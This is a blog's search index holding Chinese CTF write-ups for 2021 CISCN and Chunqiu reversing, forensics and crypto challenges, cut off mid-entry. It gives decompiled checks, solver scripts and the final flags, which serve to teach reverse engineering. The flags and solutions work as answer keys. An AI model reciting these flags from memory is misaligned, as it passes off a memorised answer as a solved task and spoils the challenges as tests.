<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021 ciscn Re部分wp</title>
      <link href="/2021/05/16/2021-05-16-2021_ciscn_Re%E9%83%A8%E5%88%86wp/"/>
      <url>/2021/05/16/2021-05-16-2021_ciscn_Re%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p>2021 ciscn Re部分wp</p><span id="more"></span><h2 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h2><p>java层没什么多余的调用，直接native调用checkflag</p><pre><code class="c++">bool __fastcall Java_com_ciscn_glass_MainActivity_checkFlag(int a1, int a2, int a3)&#123;    char *v3; // r4    int v4; // r5    char v6[256]; // [sp+0h] [bp-220h] BYREF    char v7[260]; // [sp+100h] [bp-120h] BYREF    v3 = (char *)sub_F0C(a1, a3);    if ( strlen(v3) != 39 )        return 0;    memset(v7, 0, 0x100u);    qmemcpy(v6, &quot;12345678&quot;,         sizeof(v6));    v4 = strlen(v6);    sub_FFC((int)v7, (int)v6, v4);    sub_1088((int)v7, v3, 39);    sub_10D4((int)v3, 39, (int)v6, v4);    return memcmp(v3, &amp;unk_497C, 0x27u) == 0;&#125;</code></pre><p>长度检查，密钥拷贝，进行三步操作之后和已知结果比较，前两个显然是进行rc4加密，最后一个函数三个一组，相互异或，最后再逐位和密钥异或，逆运算即可</p><pre><code class="python">target = [0xA3, 0x1A, 0xE3, 0x69, 0x2F, 0xBB, 0x1A, 0x84, 0x65, 0xC2, 0xAD, 0xAD, 0x9E, 0x96, 0x05, 0x02, 0x1F, 0x8E, 0x36,0x4F, 0xE1, 0xEB, 0xAF, 0xF0, 0xEA, 0xC4, 0xA8, 0x2D, 0x42, 0xC7, 0x6E, 0x3F, 0xB0, 0xD3, 0xCC, 0x78, 0xF9, 0x98, 0x3F]def sub_10D4(ss,  a2,  a3,  a4):    result = []    for i in ss:        result.append(i)    for j in range(a2):        result[j] ^= a3[j % a4]    for i in range(0, a2, 3):        result[i+1] ^= result[i]        result[i+2] ^= result[i+1]        result[i] ^= result[i+2]    return resultdef Rc4_init(S, K):    j = 0    k = []    for i in range(256):        S.append(i)        k.append(K[i % len(K)])    for i in range(256):        j = (j + S[i] + ord(k[i])) % 256        S[i], S[j] = S[j], S[i]def rc4_Decrypt(S, D):    i = j = 0    result = &#39;&#39;    for a in D:        i = (i + 1) % 256        j = (j + S[i]) % 256        S[i], S[j] = S[j], S[i]        t = (S[i] + S[j]) % 256        k = chr(a ^ S[(S[i] + S[j]) % 256])        result += k    return resultkey = &#39;12345678&#39;s = []Rc4_init(s, key)k0 = [49, 50, 51, 52, 53, 54, 55, 56]c = sub_10D4(target, 39, k0, 8)print(c)z = rc4_Decrypt(s, c)print(&quot;Decrypt:&quot;+z)# CISCN&#123;6654d84617f627c88846c172e0f4d46c&#125;</code></pre><h2 id="little-evil"><a href="#little-evil" class="headerlink" title="little_evil"></a>little_evil</h2><p>程序本身解压squashfs，得到里面ruby环境和需要执行的rb代码，binwalk跑一下解压出来，得到一个混淆过后的ruby代码</p><pre><code class="ruby">$l1Il=&quot;&quot;;$l1lI=&quot;&quot;;def llIl()$lI1lll=$lI1lll|7;end;def l1lll()$lI1lll=10;end;def llI1l()$lI1lll=$lI1lll|4;end;def lIlI()$lI1lll=$lI1lll+3;end;def l111()$lI1lll=$lI1lll%3;end;def lI1IlI()$lI1lll=$lI1lll|3;end;def ll1l1()$lI1lll=$lI1lll*8;end;def l1lI()$lI1lll=$lI1lll-3;end;def lI1lII()$lI1lll=$lI1lll%1;end;def lIlIl()$lI1lll=$lI1lll&amp;10;end;def lIll()$lI1lll=$lI1lll-4;end;def lII1()$lI1lll=$lI1lll%2;end;def l1III()$lI1lll=$lI1lll|1;end;def l1l111()$lI1lll=$lI1lll|5;end;def l1IIII()$lI1lll=$lI1lll%10;end;def l11I()$l1Il=$l1Il+$lI1lll.chr;end;def lIlll()$lI1lll=$lI1lll*9;end;def l11IlI()$lI1lll=$lI1lll-8;end;def lI1I1()$lI1lll=$lI1lll+5;end;def ll11lI()$lI1lll=$lI1lll&amp;9;end;def lII1l1()send($l1Il[0,4], $l1Il[4,$l1Il.length]);end;l1lll;lIlI;ll1l1;l1lI;l11I;l1lll;llI1l;lIlll;l11IlI;l11I;l1lll;lIlll;llI1l;lIlI;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llI1l;l1IIII;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI;lIlll;l11I;l1lll;llIl;l1lI...</code></pre><p>发现进行了许多赋值和字符串拼接，没有输入输出等操作，因此将send改为puts输出最终结果，可以看到使用eval执行了另一段代码</p><pre><code class="ruby">$llll=&quot;&quot;;$llII=&quot;&quot;;def l1llI()$l1lI1l=$l1lI1l|7;end;def ll1III()$l1lI1l=$l1lI1l%7;end;def lllI()$l1lI1l=$l1lI1l/4;end;def lIl1l()$l1lI1l=$l1lI1l-3;end;def l1lll()$l1lI1l=$l1lI1l|10;end;def l11I1I()$l1lI1l=10;end;def l1l1()$l1lI1l=$l1lI1l&amp;7;end;def l1II()$l1lI1l=$l1lI1l%8;end;def ll1I()$l1lI1l=$l1lI1l|8;end;def ll11()$l1lI1l=$l1lI1l^6;end;def ll1l1I()$l1lI1l=$l1lI1l|1;end;def lI1Il()$l1lI1l=$l1lI1l|3;end;def llI1I()$l1lI1l=$l1lI1l+6;end;def llIl1()$l1lI1l=$l1lI1l*4;end;def lI1ll()$l1lI1l=$l1lI1l*5;end;def l1111()$l1lI1l=$l1lI1l^7;end;def l1lII()$l1lI1l=$l1lI1l^4;end;def lIIl()$l1lI1l=$l1lI1l%5;end;def lII11()$l1lI1l=$l1lI1l+9;end;def lI11I()$llll=$llll+$l1lI1l.chr;end;def l1IlI()puts($llll[0,4], $llll[4,$llll.length]);end;l11I1I;lII11;lI1ll;llI1I;lI11I;...</code></pre><p>同样的方法改成puts之后输出</p><pre><code class="ruby">begin $_=$$/$$;    @_=$_+$_;    $-_=$_-@_    $__=-&gt;_&#123;_==[]||_==&#39;&#39;?$.:$_+$__[_[$_..$-_]]&#125; #len    @__=-&gt;_,&amp;__&#123;_==[]?[]:[__[_[$.]]]+@__[_[$_..$-_],&amp;__]&#125;    $_____=-&gt;_&#123;@__[[*_],&amp;-&gt;__&#123;__[$.]&#125;]&#125;    @_____=-&gt;_&#123;@__[[*_],&amp;-&gt;__&#123;__[$-_]&#125;]&#125;    $______=-&gt;_&#123;___,______=$_____[_],@_____[_];_____=$__[___];____=&#123;&#125;;__=$.;(_=-&gt;&#123;      ____[______[__]]=___[__];(__+=$_)==_____ ?____:_[]&#125;)[]&#125;    @______=-&gt;_,__&#123;_=[*_]+[*__];____=$__[_];___=&#123;&#125;;__=$.;(_____=-&gt;&#123;      ___[_[__][$.]]=_[__][$_];(__+=$_)==____ ?___:_____[]&#125;)[]&#125;    $_______=-&gt;_&#123;$___=[];@___=$__[_];__=___=____=$.;$____,@____=&#123;&#125;,[]    (_____=-&gt;&#123;      _[____]==&#39;5&#39;?(@____&lt;&lt;____):$.      _[____]==&#39;6&#39;?($____[@____[$-_]]=____;@____=@____[$...$.-@_]):$.      (____+=$_)==@___?$.:_____[]&#125;)[]    $____=$____==&#123;&#125;?&#123;&#125;:@______[$____,$______[$____]]    puts($____);    # puts(@____);    (______=-&gt;&#123;    # puts(_[__])    _[__]==    &#39;0&#39;?($___[___]||=$.;$___[___]+=$_):_[__]==    &#39;1&#39;?($___[___]||=$.;$___[___]-=$_):_[__]==    &#39;2&#39;?($___[___]||=$.;$___[___]=STDIN.getc.ord):_[__]==    &#39;3&#39;?(___+=$_):_[__]==    &#39;4&#39;?(___-=$_):_[__]==    &#39;5&#39;?(__=($___[___]||$.)==$.?$____[__]:__):_[__]==    &#39;6&#39;?(__=($___[___]||$.)!=$.?$____[__]:__):_[__]==    &#39;7&#39;?($&gt;&lt;&lt;(&#39;&#39;&lt;&lt;$___[___])):$.    (__+=$_)==@___?_:______[]&#125;)[]&#125;    $_______[&#39;3351635164300000000540000000003164073000000540000003164070070000071730000000541111111131641175160343516445163530440316354031643451634235163516000000054000000000003164344354131645335163435164444516333530444403331635403164344451665163423516351600000054000000000316413443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000316403443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000031640344354131645335163435164444516333530444403331635403164344451665163423516351600000540000000000031643443541316453351634351644445163335304444033316354031643444516651635164453030441633544033164533516351643000000005400000000003164171111744516644&#39;];rescue Exception;end</code></pre><p>虚拟机，按指令运行，5和6之间进行循环，读取一下指令</p><pre><code class="python">op=&#39;3351635164300000000540000000003164073000000540000003164070070000071730000000541111111131641175160343516445163530440316354031643451634235163516000000054000000000003164344354131645335163435164444516333530444403331635403164344451665163423516351600000054000000000316413443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000316403443541316453351634351644445163335304444033316354031643444516651634235163516000000005400000000000031640344354131645335163435164444516333530444403331635403164344451665163423516351600000540000000000031643443541316453351634351644445163335304444033316354031643444516651635164453030441633544033164533516351643000000005400000000003164171111744516644&#39;for i in op:    if i==&#39;0&#39;:        print(&quot;stack[idx]+=1&quot;)    elif i==&#39;1&#39;:        print(&quot;stack[idx]-=1&quot;)    elif i==&#39;2&#39;:        print(&quot;stack[idx]=getch()&quot;)    elif i==&#39;3&#39;:        print(&quot;idx++&quot;)    elif i==&#39;4&#39;:        print(&quot;idx--&quot;)    elif i==&#39;5&#39;:        print(&quot;while stack[idx]!=0:&quot;)    elif i==&#39;6&#39;:        print(&quot;end while&quot;)    elif i==&#39;7&#39;:        print(&quot;puts(stack[idx])&quot;)    else:        print(&#39;error!!!!!&#39;)</code></pre><p>之后分析解析的指令，使用这种方式进行输出</p><pre><code class="plain">stack[idx]+=8while stack[idx]!=0:idx--stack[idx]+=9idx++stack[idx]-=1end whileidx--stack[idx]+=1puts(stack[idx])</code></pre><p>前几段代码输出Input:<br>之后进行输入并验证，验证方法时进行循环，如果循环可以正常结束则最终会输出ok，如果不能则异常结束，没有输出</p><pre><code class="plain">stack[idx]=getch()idx++stack[idx]=0idx++stack[idx]=0stack[idx]+=7while stack[idx]!=0:idx--stack[idx]+=11idx++stack[idx]-=1end whileidx--while stack[idx]!=0:idx--stack[idx]-=1idx++stack[idx]-=1end while#ch-77idx--while stack[idx]!=0:idx+=2stack[idx]=0idx++stack[idx]=0idx-=4stack[idx]=0idx+=3while stack[idx]!=0:idx++stack[idx]+=1idx-=4stack[idx]+=1idx+=3stack[idx]-=1end whileidx++while stack[idx]!=0:idx--stack[idx]+=1idx++stack[idx]-=1end whileidx-=3stack[idx]=0end whilestack[idx]=0</code></pre><p>每一个循环都这样处理，循环本身是跑不出来的，所以成功的条件就是ch-77为0，不会进入循环，对于每一个循环都会得到一个数，一共5个输入，得到M5Ya7，测试成功，计算md5即可</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021年“春秋杯”新年欢乐赛</title>
      <link href="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
      <url>/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>这次的赛制是第一次见到的沙漏赛制，对我这种不急不忙佛系做题的不是很友好，最后的名次也还行，前排观赏前面的神仙打架<br><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/2769833766.png" alt="result2.png"></p><span id="more"></span><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>程序是python打包出来的，解包找到主程序checkin，补上pyc头文件，反编译得到python代码</p><pre><code class="python">import cv2, re, sysfrom aip import AipOcrfrom apii import APP_ID, API_KEY, SECRECT_KEY, flagclient = AipOcr(APP_ID, API_KEY, SECRECT_KEY)cap = cv2.VideoCapture(0)i = 0x = 1print(&#39;\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⣄⣀⢀⣀⣀⡀⠀⠀⠀⢀⣄⣀⣀⣀⣀⡀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⡤⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⢀⣹⣉⣝⢸⡇⠀⠀⠀⠀⢀⡞⠉⠉⣹⠉⠉⠁⠀⠀⢠⢼⢦⠐⢺⠓⢲⠀⠀⠀⠀⣾⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⡤⣤⠤⢸⡏⢹⠉⠀⠀⠀⢸⡏⠉⢹⠉⠉⠁⠀⠀⠘⢸⠠⠤⢼⡤⠼⠤⠀⠀⠀⠛⡒⠒⡗⢒⠒⠂⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⢀⠇⠀⠰⣸⠀⢸⠀⠀⠀⠈⠉⠉⠉⢻⠉⠉⠉⠀⠀⠀⢸⠀⣠⠏⠱⣄⠀⠀⠀⢀⡴⠁⠀⡇⠈⠳⡄⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠘⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠘⠘⠁⠀⠀⠈⠃⠀⠀⠈⠀⠈⠉⠁⠀⠀⠀⠀⠀\n&#39;)while True:    ret, frame = cap.read()    cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)    cv2.imshow(&#39;capture&#39;, frame)    cv2.imwrite(&#39;.\\i&#39; + str(i) + &#39;.png&#39;, frame)    i = i + 1    if i - 1 &gt; x:        z = open(&#39;.\\i&#39; + str(x) + &#39;.png&#39;, &#39;rb&#39;)        img = z.read()        message = client.basicGeneral(img)        for j in message.get(&#39;words_result&#39;):            words = message[&#39;words_result&#39;]            num_list = []            for s in words:                num_list.append(s[&#39;words&#39;])                final = num_list                final = &#39;&#39;.join(final)                if &#39;FUN&#39; in final:                    print(flag)                    f = open(&#39;flag.txt&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;)                    f.write(flag)                    f.close()                    sys.exit(0)                else:                    print(&#39;识别失败&#39;)                    sys.exit(0)        else:            x = x + 1    if cv2.waitKey(1) &amp; 255 == ord(&#39;q&#39;):        breakcap.release()cv2.destroyAllWindows()</code></pre><p>看了一下代码，有OCR，发现真的和题目描述一样对着电脑摄像头扫“FUN”就可以了，然后放弃继续逆向写了个大大的FUN扫出来得到flag<code>flag&#123;ju5t_f0r_FUN&#125;</code></p><h2 id="evilMem"><a href="#evilMem" class="headerlink" title="evilMem"></a>evilMem</h2><p>拿到vmem文件先用volatility查一下imageinfo</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/3172205591.png" alt="evilMem-1.png"></p><p>Win7SP1x86</p><p>然后查一下进程列表</p><pre><code class="bash">vol.py -f image.vmem --profile=Win7SP1x86 pslist</code></pre><p>发现进程</p><pre><code class="bash">0x858e1030 EvilImage.exe          1884   3516      1        7      1      0 2021-01-17 16:33:41 UTC+0000</code></pre><p>把进程内存dump出来</p><pre><code class="bash">vol.py -f image.vmem --profile=Win7SP1x86 memdump -p 1884 -D evilimage/</code></pre><p>dump出来的内存用foremost恢复一下，恢复出来的文件太多，大多是系统进程，没什么太大的研究价值，根据时间找到两个可疑文件</p><pre><code>28:    00000608.exe           16 KB          311296      01/17/2021 16:28:1929:    00000672.dll           13 KB          344064      01/17/2021 16:28:19</code></pre><p>修复一下程序segment的raw offset，反编译一下，发现exe文件时主程序EvilImage.exe，dll文件是调用的evil.dll</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/1172812708.png" alt="evilMem-2.png"></p><p>没有修复IAT，但是并不影响理解程序，这里没有太多的内容，只是调用一下Evil.dll里面的checkflag函数判断一下输入的flag是否正确就可以了</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/4170854745.png" alt="evilMem-3.png"></p><p>加密过程中出现了很明显的特征“expand 32-byte k”，很容易判断出来是chacha20，v8-v14进行密钥初始化，iv经过if判断条件的计算也可以很轻松地算出来，最后的加密结果也在内存中可以直接读取，解这个密码没有什么难度</p><pre><code class="python">import binasciifrom Crypto.Cipher import ChaCha20import structkeys = [0xAA0F37A3, 0x214FF178, 0x6FF0CC56, 0x4B65E511, 0x2F60906D, 0xCA638692, 0xA001E464, 0x2BE81780]key = b&#39;&#39;for i in keys:    key += struct.pack(&#39;&lt;I&#39;, i)secret = keyiv = struct.pack(&#39;&lt;I&#39;, 0x6E7568D7 - 0x74) + struct.pack(&#39;&lt;I&#39;, (0x217569D6 - 0x65))print(iv)msg = &#39;EE2AC08F12AF33C5D1133E75C88AADBC3D0200246522037E72623311FC838FB6&#39;msg = binascii.unhexlify(msg)msg_nonce = ivciphertext = msgcipher = ChaCha20.new(key=secret, nonce=msg_nonce)plaintext = cipher.decrypt(ciphertext)print(plaintext)# b&#39;chunqiu!&#39;# b&#39;flag&#123;R3im@aging_1ndir3ctly_LoL&#125;\x00&#39;</code></pre><h2 id="十二宫的挑衅"><a href="#十二宫的挑衅" class="headerlink" title="十二宫的挑衅"></a>十二宫的挑衅</h2><p>密码本身有点难度，但是因为和zodiac密码的解码方法完全相同，所以只要照着步骤做就很容易解出来</p><p>先对密文进行一个简单的换位</p><pre><code class="python">s = &#39;&#39;&#39;^#@$@#()/&gt;@?==%1(!)&gt;(*+3&lt;#86@-7$^.4&amp;)8%#5&amp;6!=%1#$-$+5&amp;?#!.03!%=@=1010?(*~#??.+)%&amp;.7^8=1%*^=$5$7@@8&gt;&amp;*99@0185(+7)&lt;%3#@^4&amp;@@&lt;.)$3*#%%&lt;&lt;*++.@.?=~**+!==65^@&amp;&#39;&#39;&#39;a = s.split(&#39;\n&#39;)# print(a)i = 0j = 0cc = []for z in range(9 * 17):    cc.append(a[j % 9][i % 17])    if (z + 1) % 17 == 0:        cc.append(&#39;\n&#39;)    i += 2    j += 1print(&quot;&quot;.join(cc))</code></pre><p>然后放到AZdecrypt里面跑一下就出来了</p><pre><code>IKILLED A LOT OF PEOPLE AND THE PEOPLE I KILLED WILL BECOME SLAVES TO SERVE ME THIS IS FLAG WUUHUU TAKE OFF I HOPE YOU CAN DECRYPT IT AS SOON AS POSSIBLE OR I WILL CONTINUE TO COMMIT THE CRIME</code></pre><p><del>就是flag确实不太好认</del></p><h2 id="snowww"><a href="#snowww" class="headerlink" title="snowww"></a>snowww</h2><p>盲水印，binwalk跑出结果有一个matlab脚本，在<a href="https://www.zhihu.com/question/50735753/answer/122593277">这里</a>找到讲解和提取水印的脚本</p><pre><code class="matlab">clc;clear;close all;alpha = 1;im = double(imread(&#39;original.jpg&#39;))/255;FA=fft2(im);ori=double(imread(&#39;attack.jpg&#39;))/255;FB=fft2(ori);imsize = size(im);load(&#39;encode.mat&#39;);FAO=ifft2(FB);RI = FAO-double(im);xl = 1:imsize(2);yl = 1:imsize(1);[xx,yy] = meshgrid(xl,yl);FA2=fft2(FAO);G=(FA2-FA)/alpha;GG=G;for i=1:imsize(1)*0.5    for j=1:imsize(2)        GG(M(i),N(j),:)=G(i,j,:);    endendfor i=1:imsize(1)*0.5    for j=1:imsize(2)        GG(imsize(1)+1-i,imsize(2)+1-j,:)=GG(i,j,:);    endendfigure,imshow(GG);title(&#39;extracted watermark&#39;);</code></pre><p>跑出结果</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/3133848147.png" alt="snow-1.png"></p><p><del>我当时以为这已经是对我眼睛最大的考验了</del></p><h2 id="SuperBrain"><a href="#SuperBrain" class="headerlink" title="SuperBrain"></a>SuperBrain</h2><p>似乎是一个开发板的程序，进行一系列初始化之后运行主程序</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/253024555.png" alt="superbrain-1.png"></p><p>首先会进行通信，接收地图数据和答案数据</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/3289130296.png" alt="superbrain-2.png"></p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/3801641259.png" alt="superbrain-3.png"></p><p>可以看到一共接收了36组地图和36个答案，然后执行程序判断答案是否正确</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/1411425325.png" alt="superbrain-4.png"></p><p>每次执行传入一个地图和对应的答案</p><p>执行的程序主要算法如下</p><pre><code class="cpp">answer = (char)answer;LABEL_10:  line = &amp;map[7 * answer + 1];  while ( index &lt; 7 &amp;&amp; answer &gt;= 0 &amp;&amp; answer &lt; 7 )  &#123;    addr = &amp;line[index];    ele = line[index];    if ( answer % 2 )    &#123;      if ( line[index] )      &#123;        if ( ele == 1 )        &#123;          *addr = 0;          v8 = 0;          --answer;          goto LABEL_10;        &#125;        if ( ele != 2 )        &#123;          if ( ele != 3 )            return v8 == 1;          *addr = 2;          v8 = 2;          ++answer;          goto LABEL_10;        &#125;        *addr = 1;        v8 = 1;        if ( ++index &gt;= 0 )          goto LABEL_10;      &#125;      else      &#123;        *addr = 3;        v8 = 3;        if ( --index &gt;= 0 )          goto LABEL_10;      &#125;      return v8 == 1;    &#125;    if ( line[index] )    &#123;      if ( ele == 1 )      &#123;        *addr = 2;        v8 = 2;        ++answer;        goto LABEL_10;      &#125;      if ( ele != 2 )      &#123;        if ( ele != 3 )          return v8 == 1;        *addr = 0;        v8 = 0;        --answer;        goto LABEL_10;      &#125;      *addr = 3;      v8 = 3;      if ( --index &gt;= 0 )        goto LABEL_10;      return v8 == 1;    &#125;    *addr = 1;    v8 = 1;    if ( ++index &lt; 0 )      return v8 == 1;  &#125;  return v8 == 1;</code></pre><p>可以看到类似于走迷宫的算法，分奇偶行执行不同的操作，然后发现答案只传入0-6这7种数字，直接遍历就可以跑出答案</p><p>最后一部分输出flag，需要一些数据在内存里都找的到</p><p><img src="/2021/01/31/2021-01-31-2021%E5%B9%B4%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9D%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/1235013662.png" alt="superbrain-5.png"></p><p>很容易可以解出来</p><pre><code class="cpp">#include &lt;iostream&gt;int runGame(char (*gamemap)[7], uint8_t startPoint) &#123;    char answer; // r18    int v8; // r17    int v9; // r6    int index; // r19    char *v11; // r5    char *v12; // r4    char *v13; // r4    char *v14; // r5    char *line; // r20    char *addr; // r3    int ele; // r6    char map[61]; // [sp+7h] [-79h] BYREF    index = 0;    answer = startPoint;    v8 = -1;    v9 = 0;    do &#123;        v11 = &amp;map[7 * v9];        v12 = &amp;(*gamemap)[7 * v9 - 1];        do &#123;            *++v11 = *++v12;            ++index;        &#125; while (((index - 7) &amp; 1) != 0);        for (; index &lt; 7; index += 2) &#123;            v13 = v12 + 1;            v14 = v11 + 1;            *v14 = *v13;            v12 = v13 + 1;            v11 = v14 + 1;            *v11 = *v12;        &#125;        ++v9;        index = 0;    &#125; while (v9 &lt; 7);    answer = (char) answer;    LABEL_10:    line = &amp;map[7 * answer + 1];    while (index &lt; 7 &amp;&amp; answer &gt;= 0 &amp;&amp; answer &lt; 7) &#123;        addr = &amp;line[index];        ele = line[index];        if (answer % 2) &#123;            if (line[index]) &#123;                if (ele == 1) &#123;                    *addr = 0;                    v8 = 0;                    --answer;                    goto LABEL_10;                &#125;                if (ele != 2) &#123;                    if (ele != 3)                        return v8 == 1;                    *addr = 2;                    v8 = 2;                    ++answer;                    goto LABEL_10;                &#125;                *addr = 1;                v8 = 1;                if (++index &gt;= 0)                    goto LABEL_10;            &#125; else &#123;                *addr = 3;                v8 = 3;                if (--index &gt;= 0)                    goto LABEL_10;            &#125;            return v8 == 1;        &#125;        if (line[index]) &#123;            if (ele == 1) &#123;                *addr = 2;                v8 = 2;                ++answer;                goto LABEL_10;            &#125;            if (ele != 2) &#123;                if (ele != 3)                    return v8 == 1;                *addr = 0;                v8 = 0;                --answer;                goto LABEL_10;            &#125;            *addr = 3;            v8 = 3;            if (--index &gt;= 0)                goto LABEL_10;            return v8 == 1;        &#125;        *addr = 1;        v8 = 1;        if (++index &lt; 0)            return v8 == 1;    &#125;    return v8 == 1;&#125;int main() &#123;    char gameMap[36][11][7] = &#123;&#123;                                      &#123;1, 0, 0, 0, 0, 0, 0,&#125;,                                      &#123;3, 0, 2, 2, 3, 1, 3,&#125;,                                      &#123;1, 3, 2, 1, 2, 2, 1,&#125;,                                      &#123;3, 2, 3, 1, 0, 1, 0,&#125;,                                      &#123;3, 3, 0, 1, 2, 1, 0,&#125;,                                      &#123;0, 3, 2, 2, 2, 1, 3,&#125;,                                      &#123;2, 2, 2, 2, 1, 2, 3,&#125;,                              &#125;,                              &#123;                                      &#123;0, 0, 0, 0, 0, 1, 0,&#125;,                                      &#123;0, 2, 2, 2, 1, 1, 1,&#125;,                                      &#123;0, 2, 3, 2, 2, 0, 1,&#125;,                                      &#123;0, 3, 1, 0, 2, 0, 1,&#125;,                                      &#123;0, 0, 2, 1, 3, 1, 1,&#125;,                                      &#123;3, 0, 1, 2, 2, 0, 2,&#125;,                                      &#123;3, 3, 3, 0, 2, 3, 3,&#125;,                              &#125;,                              ……………………………………                              &#123;                                      &#123;3, 3, 1, 3, 3, 0, 2,&#125;,                                      &#123;1, 2, 1, 3, 0, 2, 3,&#125;,                                      &#123;0, 1, 2, 3, 1, 1, 2,&#125;,                                      &#123;2, 1, 0, 3, 0, 2, 1,&#125;,                                      &#123;3, 3, 0, 2, 3, 1, 2,&#125;,                                      &#123;2, 2, 3, 3, 2, 3, 1,&#125;,                                      &#123;3, 2, 2, 3, 0, 2, 3,&#125;,                              &#125;,                              &#123;                                      &#123;1, 0, 2, 0, 2, 3, 0,&#125;,                                      &#123;2, 1, 3, 0, 0, 3, 0,&#125;,                                      &#123;2, 3, 0, 0, 1, 2, 0,&#125;,                                      &#123;3, 3, 0, 2, 0, 1, 1,&#125;,                                      &#123;3, 0, 3, 2, 1, 2, 0,&#125;,                                      &#123;0, 3, 2, 1, 0, 2, 2,&#125;,                                      &#123;2, 3, 2, 2, 2, 0, 1,&#125;,                              &#125;,    &#125;;    int res[36];    for (int i = 0; i &lt; 36; i++) &#123;        for (int j = 0; j &lt; 7; j++) &#123;            if (runGame(gameMap[i], j)) &#123;                res[i] = j;                break;            &#125;        &#125;    &#125;    std::string charDic = &quot;0123456789abcdef-&quot;;    int base[] = &#123;0x17, 0x06, 0x0A, 0x20, 0x2D, 0x0B, 0x39, 0x01, 0x0A, 0x10,                  0x5E, 0x01, 0x1A, 0x0F, 0x51, 0x59, 0x06, 0x1F, 0x0E, 0x09,                  0x23, 0x47, 0x03, 0x0A, 0x38, 0x05, 0x48, 0x23, 0x02, 0x0A,                  0x12, 0x33, 0x1D, 0x1F, 0x48, 0x15&#125;;    std::cout &lt;&lt; &quot;flag&#123;&quot;;    for (int i = 0; i &lt; 36; i++)        std::cout &lt;&lt; charDic[(res[i] + base[i]) % 17];    std::cout &lt;&lt; &quot;&#125;&quot; &lt;&lt; std::endl;    return 0;&#125;//flag&#123;ace40f94-1b3d-d97f-f256-bb726e611fa7&#125;</code></pre><h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><p>每个碎片都加了噪声，还有很多碎片有很大部分重复内容，就算是拼出来图片也看不清楚是什么字符……</p><p>但是又太菜了写不出脚本识别，就只能手动拼图+ps识图</p><pre><code>flag&#123;w9w45my6x8kk4e8gp9nqm6j2c154wad49&#125;</code></pre><h2 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" 